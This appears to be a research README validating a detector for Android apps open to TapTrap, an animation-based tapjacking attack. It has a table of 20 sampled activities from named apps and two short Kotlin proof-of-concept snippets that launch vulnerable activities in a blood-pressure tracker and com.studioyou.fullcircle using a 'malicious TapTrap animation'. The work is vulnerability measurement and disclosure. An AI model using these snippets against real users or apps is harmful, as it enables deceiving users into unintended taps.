# Validation of the Vulnerable App Detection Pipeline

We validate the findings of the vulnerable app detection pipeline.
The validation process works as follows:

- We randomly select 10 apps of our dataset with `ls ../results/2025-05-20/output | shuf | head -n 10`
- For each app, we randomly select 2 activities
- We manually analyze the selected activities and try to run TapTrap. If we fail to run TapTrap, we note the first reason for the failure.
- We cross-check the results of our manual analysis with the result of the tool, i.e., whether the tool correctly identified the activity as vulnerable or not

## Validation Result

| Package                                        | Activity                                                                 | Vulnerable (Manual) | Vulnerable (Tool) | Correct Classification? |
|-----------------------------------------------|-------------------------------------------------------------------------|----------------------|-------------------|--------------------------|
| com.an.bloodpressure.bloodsugar.bptracker     | com.an.bloodpressure.bloodsugar.bptracker.heart_rate.HeartRateActivity  | yes                  | yes               | yes                      |
| com.an.bloodpressure.bloodsugar.bptracker     | com.applovin.mediation.MaxDebuggerActivity                              | no (not exported)    | no                | yes                      |
| com.eggrollgames.animalmathgrade1free         | com.ansca.corona.CoronaActivity                                         | no (not same task)   | no               | yes                       |
| com.eggrollgames.animalmathgrade1free         | com.ansca.corona.purchasing.StoreActivity                               | no (not exported)    | no               | yes                       |
| com.clear.likejesus                           | com.clear.likejesus.MainActivity                                        | no (not same task)   | no               | yes                       |
| com.clear.likejesus                           | com.google.firebase.auth.internal.RecaptchaActivity                     | no (could not open, not same task)      | no              | yes      |
| com.simyasolutions.writeme.ar                 | com.google.firebase.auth.internal.FederatedSignInActivity               | no (permission required)  | no          | yes
| com.simyasolutions.writeme.ar                 | com.facebook.CustomTabMainActivity                                      | no (not exported)     | no              | yes                        |
| com.studioyou.fullcircle                      | com.canhub.cropper.CropImageActivity                                    | yes                   | yes             | yes                        |
| com.studioyou.fullcircle                      | com.stripe.android.payments.StripeBrowserProxyReturnActivity            | no (could not open, not same task)      | no              | yes      |
| screenrecorder.videorecorder.rec.video.screen.recorder | com.tianxingjian.screenshot.ui.activity.AboutActivity          | no (not exported)     | no              | yes
| screenrecorder.videorecorder.rec.video.screen.recorder | com.superlab.feedback.activity.PreviewPictureActivity          | no (not exported)     | no              | yes
| com.tigonmobile.yulgan                        | com.joypiegame.rxjh.WebActivity                                         | no (not exported)     | no              | yes
| com.tigonmobile.yulgan                        | com.twitter.sdk.android.tweetui.PlayerActivity                          | no (not exported)     | no              | yes
| org.koboc.collect.android                     | org.odk.collect.android.activities.FormFillingActivity                  | no (not exported)     | no              | yes
| org.koboc.collect.android                     | org.odk.collect.errors.ErrorActivity                                    | no (not exported)     | no              | yes
| beauty.keyboard.wallpaper.flowerlanguage      | beauty.keyboard.wallpaper.flowerlanguage.direct.DirectEditorActivity    | no (not exported)     | no              | yes
| beauty.keyboard.wallpaper.flowerlanguage      | com.google.android.gms.ads.NotificationHandlerActivity                  | no (not exported)     | no              | yes
| relaxmusic.rainsounds.sleepsounds             | relaxmusic.rainsounds.sleepsounds.fsounds.settime.SetCustomTimeActivity | no (not exported)     | no              | yes
| relaxmusic.rainsounds.sleepsounds             | relaxmusic.rainsounds.sleepsounds.util.debug.DebugLanguageActivity      | no (not exported)     | no              | yes

### PoCs

The following PoCs can be used to run TapTrap on the given activities. `R.anim.fade_in` refers to a malicious TapTrap animation.

#### com.an.bloodpressure.bloodsugar.bptracker/com.an.bloodpressure.bloodsugar.bptracker.heart_rate.HeartRateActivity

```kotlin
val options = ActivityOptions.makeCustomAnimation(this, R.anim.fade_in, 0)
val intent = Intent().apply {
    setClassName("com.an.bloodpressure.bloodsugar.bptracker", "com.an.bloodpressure.bloodsugar.bptracker.heart_rate.HeartRateActivity")
}
startActivity(intent, options.toBundle())
```

#### com.studioyou.fullcircle/com.canhub.cropper.CropImageActivity

```kotlin
val options = ActivityOptions.makeCustomAnimation(this, R.anim.fade_in, 0)
val intent = Intent().apply {
    setClassName("com.studioyou.fullcircle", "com.canhub.cropper.CropImageActivity")
}
startActivity(intent, options.toBundle())
```